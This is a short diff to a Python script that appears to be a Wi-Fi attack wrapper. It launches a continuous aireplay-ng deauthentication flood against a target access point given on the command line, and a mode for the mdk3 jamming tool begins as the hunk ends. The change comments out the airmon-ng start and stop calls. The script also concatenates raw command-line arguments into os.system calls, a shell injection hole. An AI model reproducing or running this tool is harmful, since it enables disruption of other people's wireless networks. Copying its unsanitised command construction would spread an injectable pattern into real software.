@@ -48,9 +48,9 @@ def start():
       if(sys.argv[2] == "--a"):
          mode="aireplay-ng "
          print("#############################"+mode+"#############################")
-         os.system("airmon-ng start "+str(sys.argv[5])+"")
+         #os.system("airmon-ng start "+str(sys.argv[5])+"")
          os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
-         os.system("airmon-ng stop "+str(sys.argv[5])+"")
+         #os.system("airmon-ng stop "+str(sys.argv[5])+"")
          
       if(sys.argv[2] == "--m"):
          mode="mdk3 "
